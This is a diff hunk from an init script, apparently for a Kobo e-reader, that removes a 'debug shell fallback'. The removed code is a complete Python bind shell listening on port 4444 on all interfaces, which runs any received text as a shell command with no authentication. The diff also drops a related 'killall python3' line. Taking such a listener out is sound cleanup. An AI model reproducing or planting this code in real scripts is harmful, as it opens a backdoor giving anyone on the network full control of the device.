@@ -80,27 +80,9 @@ case "$1" in
             chmod +x /mnt/onboard/.adds/*.sh 2>/dev/null
         fi
         [ -f /mnt/onboard/.adds/ssh-start.sh ] && /mnt/onboard/.adds/ssh-start.sh
-        # Debug shell fallback (port 4444, remove after setup is confirmed)
-        python3 -c "
-import socket,subprocess,threading
-def h(c):
- try:
-  while True:
-   d=c.recv(4096)
-   if not d:break
-   r=subprocess.run(d.decode().strip(),shell=True,capture_output=True,text=True,timeout=30)
-   c.sendall((r.stdout+r.stderr+'\\n').encode())
- except:pass
- finally:c.close()
-s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-s.bind(('',4444));s.listen(5)
-while True:
- c,a=s.accept();threading.Thread(target=h,args=(c,),daemon=True).start()
-" &
         ;;
     stop)
         [ -f /mnt/onboard/.adds/ssh-stop.sh ] && /mnt/onboard/.adds/ssh-stop.sh
-        killall python3 2>/dev/null
         ;;
 esac
 INITEOF
